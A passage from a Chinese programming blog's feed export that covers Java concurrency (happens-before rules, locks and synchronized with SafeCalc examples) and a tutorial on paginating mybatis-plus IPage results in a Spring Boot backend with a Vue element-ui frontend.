规则<br>这条是关于线程启动的。它是指主线程 A 启动子线程 B 后，子线程 B 能够看到主线程在启动子线程 B 前的操作。<br>换句话说就是，如果线程 A 调用线程 B 的 start() 方法（即在线程 A 中启动线程 B），那么该 start() 操作 Happens-Before 于线程 B 中的任意操作。具体可参考下面示例代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Thread B = <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line"><span class="comment">// 主线程调用 B.start() 之前</span></span><br><span class="line"><span class="comment">// 所有对共享变量的修改，此处皆可见</span></span><br><span class="line"><span class="comment">// 此例中，var==77</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 此处对共享变量 var 修改</span></span><br><span class="line"><span class="keyword">var</span> = <span class="number">77</span>;</span><br><span class="line"><span class="comment">// 主线程启动子线程</span></span><br><span class="line">B.start();</span><br></pre></td></tr></table></figure></li><li><p>线程 join() 规则<br>这条是关于线程等待的。它是指主线程 A 等待子线程 B 完成（主线程 A 通过调用子线程 B 的 join() 方法实现），当子线程 B 完成后（主线程 A 中 join() 方法返回），主线程能够看到子线程的操作。当然所谓的“看到”，指的是对共享变量的操作。<br>换句话说就是，如果在线程 A 中，调用线程 B 的 join() 并成功返回，那么线程 B 中的任意操作 Happens-Before 于该 join() 操作的返回。具体可参考下面示例代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Thread B = <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line"><span class="comment">// 此处对共享变量 var 修改</span></span><br><span class="line"><span class="keyword">var</span> = <span class="number">66</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 例如此处对共享变量修改，</span></span><br><span class="line"><span class="comment">// 则这个修改结果对线程 B 可见</span></span><br><span class="line"><span class="comment">// 主线程启动子线程</span></span><br><span class="line">B.start();</span><br><span class="line">B.join()</span><br><span class="line"><span class="comment">// 子线程所有对共享变量的修改</span></span><br><span class="line"><span class="comment">// 在主线程调用 B.join() 之后皆可见</span></span><br><span class="line"><span class="comment">// 此例中，var==66</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="解决原子性问题"><a href="#解决原子性问题" class="headerlink" title="解决原子性问题"></a>解决原子性问题</h3><p>根据上文源头我们已经知道，原子性问题的源头是线程切换，如果能够禁用线程切换那不就能解决这个问题了吗？而操作系统做线程切换是依赖 CPU 中断的，所以禁止CPU 发生中断就能够禁止线程切换。</p><p>在早期单核 CPU 时代，这个方案的确是可行的，而且也有很多应用案例，但是并不适合多核场景。这里我们以 32 位 CPU 上执行 long 型变量的写操作为例来说明这个问题，long型变量是 64 位，在 32 位 CPU 上执行写操作会被拆分成两次写操作（写高 32 位和写低32 位，如下图所示）。<br><img src="/img/thread/32位CPU执行64位变量long的写操作.png" alt="32位CPU执行64位变量long的写操作"> </p><p>在单核 CPU 场景下，同一时刻只有一个线程执行，禁止 CPU 中断，意味着操作系统不会重新调度线程，也就是禁止了线程切换，获得 CPU 使用权的线程就可以不间断地执行，所以两次写操作一定是：要么都被执行，要么都没有被执行，具有原子性。但是在多核场景下，同一时刻，有可能有两个线程同时在执行，一个线程执行在 CPU-1上，一个线程执行在 CPU-2 上，此时禁止 CPU 中断，只能保证 CPU 上的线程连续执行，并不能保证同一时刻只有一个线程执行，如果这两个线程同时写 long 型变量高 32 位的话，那就有可能出现我们开头提及的诡异Bug了。“同一时刻只有一个线程执行”这个条件非常重要，我们称之为互斥。如果我们能够保证对共享变量的修改是互斥的，那么，无论是单核 CPU 还是多核 CPU，就都能保证原子性了。</p><h4 id="简易锁模型"><a href="#简易锁模型" class="headerlink" title="简易锁模型"></a>简易锁模型</h4><p>当谈到互斥，相信聪明的你一定想到了那个杀手级解决方案：锁。同时大脑中还会出现以下模型：<br><img src="/img/thread/简易锁模型.png" alt="简易锁模型"> </p><p>我们把一段需要互斥执行的代码称为临界区。线程在进入临界区之前，首先尝试加锁lock()，如果成功，则进入临界区，此时我们称这个线程持有锁；否则呢就等待，直到持有锁的线程解锁；持有锁的线程执行完临界区的代码后，执行解锁 unlock()。这个过程非常像办公室里高峰期抢占坑位，每个人都是进坑锁门（加锁），出坑开门（解锁），如厕这个事就是临界区。很长时间里，我也是这么理解的。这样理解本身没有问题，但却很容易让我们忽视两个非常非常重要的点：我们锁的是什么？我们保护的又是什么？</p><h4 id="改进后的锁模型"><a href="#改进后的锁模型" class="headerlink" title="改进后的锁模型"></a>改进后的锁模型</h4><p>我们知道在现实世界里，锁和锁要保护的资源是有对应关系的，比如你用你家的锁保护你家的东西，我用我家的锁保护我家的东西。在并发编程世界里，锁和资源也应该有这个关系，但这个关系在我们上面的模型中是没有体现的，所以我们需要完善一下我们的模型。<br><img src="/img/thread/改进后的锁模型.png" alt="改进后的锁模型"></p><p>首先，我们要把临界区要保护的资源标注出来，如图中临界区里增加了一个元素：受保护的资源 R；其次，我们要保护资源 R 就得为它创建一把锁 LR；最后，针对这把锁 LR，我们还需在进出临界区时添上加锁操作和解锁操作。另外，在锁 LR 和受保护资源之间，我特地用一条线做了关联，这个关联关系非常重要。很多并发Bug的出现都是因为把它忽略了，然后就出现了类似锁自家门来保护他家资产的事情，这样的 Bug 非常不好诊断，因为潜意识里我们认为已经正确加锁了。 </p><h4 id="Java-语言提供的锁技术：synchronized"><a href="#Java-语言提供的锁技术：synchronized" class="headerlink" title="Java 语言提供的锁技术：synchronized"></a>Java 语言提供的锁技术：synchronized</h4><p>锁是一种通用的技术方案，Java 语言提供的 synchronized 关键字，就是锁的一种实现。<br>synchronized 关键字可以用来修饰方法，也可以用来修饰代码块，它的使用示例基本上都<br>是下面这个样子：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span> </span>&#123;</span><br><span class="line"><span class="comment">// 修饰非静态方法</span></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// 临界区</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 修饰静态方法</span></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bar</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// 临界区</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 修饰代码块</span></span><br><span class="line">Object obj = <span class="keyword">new</span> Object()；</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">baz</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">synchronized</span>(obj) &#123;</span><br><span class="line"><span class="comment">// 临界区</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>看完之后你可能会觉得有点奇怪，这个和我们上面提到的模型有点对不上号啊，加锁 lock()<br>和解锁 unlock() 在哪里呢？其实这两个操作都是有的，只是这两个操作是被 Java 默默加<br>上的，Java 编译器会在 synchronized 修饰的方法或代码块前后自动加上加锁 lock() 和解<br>锁 unlock()，这样做的好处就是加锁 lock() 和解锁 unlock() 一定是成对出现的，毕竟忘记<br>解锁 unlock() 可是个致命的 Bug（意味着其他线程只能死等下去了）。<br>那 synchronized 里的加锁 lock() 和解锁 unlock() 锁定的对象在哪里呢？上面的代码我们<br>看到只有修饰代码块的时候，锁定了一个 obj 对象，那修饰方法的时候锁定的是什么呢？<br>这个也是 Java 的一条隐式规则：</p><blockquote><p>当修饰静态方法的时候，锁定的是当前类的 Class 对象，在上面的例子中就<br>是 Class X；<br>当修饰非静态方法的时候，锁定的是当前实例对象 this。</p></blockquote><p>对于上面的例子，synchronized 修饰静态方法相当于:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span> </span>&#123;</span><br><span class="line"><span class="comment">// 修饰静态方法</span></span><br><span class="line"><span class="keyword">synchronized</span>(X<span class="class">.<span class="keyword">class</span>) <span class="title">static</span> <span class="title">void</span> <span class="title">bar</span>() </span>&#123;</span><br><span class="line"><span class="comment">// 临界区</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>修饰非静态方法，相当于：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span> </span>&#123;</span><br><span class="line"> <span class="comment">// 修饰非静态方法</span></span><br><span class="line"> <span class="keyword">synchronized</span>(<span class="keyword">this</span>) <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="comment">// 临界区</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="用-synchronized-解决-count-1-问题"><a href="#用-synchronized-解决-count-1-问题" class="headerlink" title="用 synchronized 解决 count+=1 问题"></a>用 synchronized 解决 count+=1 问题</h4><p>相信你一定记得我们前面文章中提到过的 count+=1 存在的并发问题，现在我们可以尝试用 synchronized 来小试牛刀一把，代码如下所示。SafeCalc 这个类有两个方法：一个是get() 方法，用来获得 value 的值；另一个是 addOne() 方法，用来给 value 加 1，并且addOne() 方法我们用 synchronized修饰。那么我们使用的这两个方法有没有并发问题呢？<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SafeCalc</span> </span>&#123;</span><br><span class="line"> <span class="keyword">long</span> value = <span class="number">0L</span>;</span><br><span class="line"> <span class="function"><span class="keyword">long</span> <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> value;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> value += <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们先来看看 addOne() 方法，首先可以肯定，被 synchronized 修饰后，无论是单核CPU 还是多核 CPU，只有一个线程能够执行 addOne() 方法，所以一定能保证原子操作，那是否有可见性问题呢？要回答这问题，就要重温一下上文中提到的管程中锁的规则。</p><blockquote><p>管程中锁的规则：对一个锁的解锁 Happens-Before 于后续对这个锁的加锁</p></blockquote><p>管程，就是我们这里的 synchronized（至于为什么叫管程，下篇文章介绍），我们知道synchronized 修饰的临界区是互斥的，也就是说同一时刻只有一个线程执行临界区的代码；而所谓“对一个锁解锁 Happens-Before 后续对这个锁的加锁”，指的是前一个线程<br>的解锁操作对后一个线程的加锁操作可见，综合 Happens-Before 的传递性原则，我们就能得出前一个线程在临界区修改的共享变量（该操作在解锁之前），对后续进入临界区（该操作在加锁之后）的线程是可见的。</p><p>按照这个规则，如果多个线程同时执行 addOne() 方法，可见性是可以保证的，也就说如果有 1000 个线程执行 addOne() 方法，最终结果一定是 value 的值增加了 1000。看到这个结果，我们长出一口气，问题终于解决了。</p><p>但也许，你一不小心就忽视了get()方法。执行addOne()方法后，value的值对get()方法是可见的吗？这个可见性是没法保证的。管程中锁的规则，是只保证后续对这个锁的加锁的可见性，而 get() 方法并没有加锁操作，所以可见性没法保证。那如何解决呢？很简单，就是 get() 方法也 synchronized 一下，完整的代码如下所示。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SafeCalc</span> </span>&#123;</span><br><span class="line"><span class="keyword">long</span> value = <span class="number">0L</span>;</span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">long</span> <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">value += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上面的代码转换为我们提到的锁模型，就是下面图示这个样子。get() 方法和 addOne() 方法都需要访问 value 这个受保护的资源，这个资源用 this 这把锁来保护。线程要进入临界区 get() 和 addOne()，必须先获得 this 这把锁，这样 get() 和 addOne() 也是互斥的。<br><img src="/img/thread/保护临界区get和addOne的示意图.png" alt="保护临界区get()和addOne()的示意图"></p><p>这个模型更像现实世界里面球赛门票的管理，一个座位只允许一个人使用，这个座位就是“受保护资源”，球场的入口就是 Java 类里的方法，而门票就是用来保护资源的“锁”，Java 里的检票工作是由 synchronized 解决的。锁和受保护资源的关系我们前面提到，受保护资源和锁之间的关联关系非常重要，他们的关系是怎样的呢？一个合理的关系是：受保护资源和锁之间的关联关系是 N:1 的关系。还拿前面球赛门票的管理来类比，就是一个座位，我们只能用一张票来保护，如果多发了重复的票，那就要打架了。现实世界里，我们可以用多把锁来保护同一个资源，但在并发领域是不行的，并发领域的锁和现实世界的锁不是完全匹配的。不过倒是可以用同一把锁来保护多个资源，这个对应到现实世界就是我们所谓的“包场”了。上面那个例子我稍作改动，把 value 改成静态变量，把 addOne() 方法改成静态方法，此时 get() 方法和 addOne() 方法是否存在并发问题呢？<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SafeCalc</span> </span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">long</span> value = <span class="number">0L</span>;</span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">long</span> <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">value += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果你仔细观察，就会发现改动后的代码是用两个锁保护一个资源。这个受保护的资源就是静态变量value，两个锁分别是this和SafeCalc.class。我们可以用下面这幅图来形象描述这个关系。由于临界区 get() 和 addOne() 是用两个锁保护的，因此这两个临界区没有互斥关系，临界区 addOne() 对 value 的修改对临界区 get() 也没有可见性保证，这就导致并发问题了。<br><img src="/img/thread/两把锁保护一个资源的示意图.png" alt="两把锁保护一个资源的示意图"></p>]]></content>
      
      
      <categories>
          
          <category> 并发编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 并发编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>element-ui+mybatis-plus+springboot解决IPage分页问题</title>
      <link href="/2020/11/06/element-ui-mybatis-plus-springboot%E8%A7%A3%E5%86%B3IPage%E5%88%86%E9%A1%B5%E9%97%AE%E9%A2%98/"/>
      <url>/2020/11/06/element-ui-mybatis-plus-springboot%E8%A7%A3%E5%86%B3IPage%E5%88%86%E9%A1%B5%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本文应用于ssm框架，解决controller接口返回mybatis-plus封装的IPage类型与Vue.element-ui前端的接收与分页</p><h2 id="mybatis-plus中的IPage与Page类"><a href="#mybatis-plus中的IPage与Page类" class="headerlink" title="mybatis-plus中的IPage与Page类"></a>mybatis-plus中的IPage与Page类</h2><p>首先上源码(部分)<br>接口Ipage类型：<br><img src="/img/vue/IPage.PNG" alt="Ipage部分源码"><br>IPage的实现类Page:<br><img src="/img/vue/Page.PNG" alt="Page部分源码"></p><p>源码可见Page是IPage的实现类，可见想使用mybatis-plus的封装分页则要明白Page类的属性<br>Page类的属性介绍：<br>records 用来存放查询出来的数据<br>total 返回记录的总数<br>size 每页显示条数，默认 10<br>current 当前页,默认1<br>orders 排序字段信息<br>optimizeCountSql 自动优化 COUNT SQL,默认true<br>isSearchCount 是否进行 count 查询,默认true<br>hitCount 是否命中count缓存,默认false</p><h2 id="实战实现"><a href="#实战实现" class="headerlink" title="实战实现"></a>实战实现</h2><h3 id="后端接口："><a href="#后端接口：" class="headerlink" title="后端接口："></a>后端接口：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/getOtherWorkList"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IPage&lt;Work&gt; <span class="title">getOtherWorkByParam</span><span class="params">(@RequestParam <span class="keyword">long</span> size, @RequestParam <span class="keyword">long</span> current, HttpServletRequest request, WorkParam workParam)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TokenUtil tokenUtil = <span class="keyword">new</span> TokenUtil();</span><br><span class="line">        String userId = tokenUtil.getRequestToken(request, redisService);</span><br><span class="line">        Page&lt;Work&gt; page = <span class="keyword">new</span> Page&lt;&gt;();</span><br><span class="line">        page.setCurrent(current);</span><br><span class="line">        page.setSize(size);</span><br><span class="line">        Page&lt;Work&gt; workPage = workService.page(page,Wrappers.&lt;Work&gt;lambdaQuery()</span><br><span class="line">                .eq(!workParam.getTitle().isEmpty() &amp;&amp; !workParam.getTitle().equals(<span class="string">""</span>), Work::getTitle, workParam.getTitle())</span><br><span class="line">                .eq(workParam.getStatus()!=<span class="keyword">null</span>, Work::getStatus, workParam.getStatus())</span><br><span class="line">                .eq(workParam.getType() != <span class="keyword">null</span>, Work::getType, workParam.getType())</span><br><span class="line">                .ne(userId!=<span class="keyword">null</span>, Work::getUserId, userId)</span><br><span class="line">                .between(workParam.getStartDate() != <span class="keyword">null</span> &amp;&amp; workParam.getStartDate().before(workParam.getEndDate()), Work::getCreateDate, workParam.getStartDate(), workParam.getEndDate()));</span><br><span class="line">        <span class="keyword">return</span> workPage;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>形参中size和current分别代表每页容量、当前页与Page类中属性名对应，形参能使用参数Page<Work> page更好，request用户获取请求头token验证登录用户，workParm为查询条件为前端table传来的检索条件</p><p>方便理解可以简化成以下代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/getOtherWorkList"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IPage&lt;Work&gt; <span class="title">getOtherWorkByParam</span><span class="params">(Page&lt;Work&gt; page)</span></span>&#123;</span><br><span class="line">        Page&lt;Work&gt; workPage = workService.page(page);</span><br><span class="line">        <span class="keyword">return</span> workPage;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h3 id="前端请求发送与数据分页"><a href="#前端请求发送与数据分页" class="headerlink" title="前端请求发送与数据分页"></a>前端请求发送与数据分页</h3><p>前端分页</p><p>分页组件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;pagination&quot;&gt;</span><br><span class="line">     &lt;el-pagination</span><br><span class="line">        @size-change&#x3D;&quot;handleSizeChange&quot;</span><br><span class="line">        @current-change&#x3D;&quot;handleCurrentChange&quot;</span><br><span class="line">        :current-page&#x3D;&quot;page.current&quot;</span><br><span class="line">        :page-sizes&#x3D;&quot;[1, 5, 10, 20]&quot;</span><br><span class="line">        :page-size&#x3D;&quot;page.size&quot;</span><br><span class="line">        layout&#x3D;&quot;total, sizes, prev, pager, next, jumper&quot;</span><br><span class="line">        :total&#x3D;&quot;pageTotal&quot;&gt;</span><br><span class="line">    &lt;&#x2F;el-pagination&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure></p><p>table组件与处理数据分页:<br>注意：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:data&#x3D;&quot;records.slice((page.current-1)*page.size,page.current*page.size)&quot;</span><br></pre></td></tr></table></figure><br>请务必加上，page.current和page.size取决于你自己vue定义的数据属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-table</span><br><span class="line">               :data&#x3D;&quot;records.slice((page.current-1)*page.size,page.current*page.size)&quot;</span><br><span class="line">               border</span><br><span class="line">               class&#x3D;&quot;table&quot;</span><br><span class="line">               ref&#x3D;&quot;multipleTable&quot;</span><br><span class="line">               header-cell-class-name&#x3D;&quot;table-header&quot;</span><br><span class="line">               @selection-change&#x3D;&quot;handleSelectionChange&quot;</span><br><span class="line">           &gt;</span><br></pre></td></tr></table></figure><p>Vue定义绑定数据:<br>注意：Page数据在records中，注意看Page源码属性类型介绍<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            tableData: [],</span><br><span class="line">            records: [],</span><br><span class="line">            multipleSelection: [],</span><br><span class="line">            page: &#123;</span><br><span class="line">                size: 1,</span><br><span class="line">                current: 1</span><br><span class="line">            &#125;,</span><br><span class="line">            workParam: &#123;&#125;,</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure></p><p>Vue请求发送与接收数据:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">created() &#123;</span><br><span class="line">       this.getData();</span><br><span class="line">   &#125;,</span><br><span class="line">   methods: &#123;</span><br><span class="line">       &#x2F;&#x2F; 获取 easy-mock 的模拟数据</span><br><span class="line">       async getData() &#123;</span><br><span class="line">           this.$http</span><br><span class="line">           .get(&#96;&#x2F;api&#x2F;work&#x2F;getOtherWorkList&#96;, &#123;</span><br><span class="line">           params: &#123;</span><br><span class="line">               size: this.page.size,</span><br><span class="line">               current: this.page.current</span><br><span class="line">           &#125;,</span><br><span class="line">           headers: &#123;</span><br><span class="line">           token: this.token,</span><br><span class="line">           &#125;,</span><br><span class="line">           &#125;)</span><br><span class="line">           .then((response) &#x3D;&gt; &#123;</span><br><span class="line">               this.records &#x3D; response.data.records;</span><br><span class="line">               console.log(this.records);</span><br><span class="line">               this.pageTotal &#x3D; response.data.total;</span><br><span class="line">               console.log(this.pageTotal);</span><br><span class="line">           &#125;)</span><br><span class="line">       &#125;,</span><br></pre></td></tr></table></figure></p><p>选择页面size事件方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">handleSizeChange(newSize)&#123;</span><br><span class="line">    console.log(newSize)</span><br><span class="line">    this.page.size &#x3D; newSize;</span><br><span class="line">    console.log(&#96;目前页面容量&#96;+this.query.pageSize)</span><br><span class="line">    this.getData()</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p><p>选择页码事件方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">handleCurrentChange(newPage)&#123;</span><br><span class="line">    console.log(newPage)</span><br><span class="line">    this.page.current &#x3D; newPage;</span><br><span class="line">    this.getData()</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p><h4 id="实现效果展示"><a href="#实现效果展示" class="headerlink" title="实现效果展示"></a>实现效果展示</h4><p><img src="/img/vue/分页1.PNG" alt="分页1"><br><img src="/img/vue/分页2.PNG" alt="分页2"><br><img src="/img/vue/分页3.PNG" alt="分页3"></p><h3 id="后端分页"><a href="#后端分页" class="headerlink" title="后端分页"></a>后端分页</h3><p>数据量较大每次由后端分页并发送给前端</p><p>后端分页代码发送前端数据代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">** PageUtil.listToPage()方法作用为将list转化为Page类对象</span><br><span class="line">*&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;noParams&#x2F;getTableDataChartData&quot;)</span><br><span class="line">public Page&lt;BidInfor&gt; getTableData()&#123;</span><br><span class="line">    EchartsVo echartsVo &#x3D; new EchartsVo();</span><br><span class="line">    &#x2F;&#x2F; 查看redis缓存</span><br><span class="line">    if (redisService.get(Constant.REDIS_CACHE_SYS_NO_PARAMS_TABLE_CHARTS) !&#x3D; null) &#123;</span><br><span class="line">        String echartsVojSON &#x3D; redisService.get(Constant.REDIS_CACHE_SYS_NO_PARAMS_TABLE_CHARTS).toString();</span><br><span class="line">        echartsVo &#x3D; JSONObject.parseObject(echartsVojSON, EchartsVo.class);</span><br><span class="line">        List&lt;BidInfor&gt; bidInforList &#x3D; echartsVo.getTableData();</span><br><span class="line">        return PageUtil.listToPage(bidInforList, 1, 100);</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;BidInfor&gt; bidInforList &#x3D; bidInforService.tableDataOrderByAmount();</span><br><span class="line">    echartsVo.setTableData(bidInforList);</span><br><span class="line">    redisService.set(Constant.REDIS_CACHE_SYS_NO_PARAMS_TABLE_CHARTS, echartsVo);</span><br><span class="line">    return PageUtil.listToPage(bidInforList, 1, 100);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">** 简化代码</span><br><span class="line">*&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;noParams&#x2F;getTableDataChartData&quot;)</span><br><span class="line">public Page&lt;BidInfor&gt; getTableData()&#123;</span><br><span class="line">    List&lt;BidInfor&gt; bidInforList &#x3D; bidInforService.tableDataOrderByAmount();</span><br><span class="line">    return PageUtil.listToPage(bidInforList, 1, 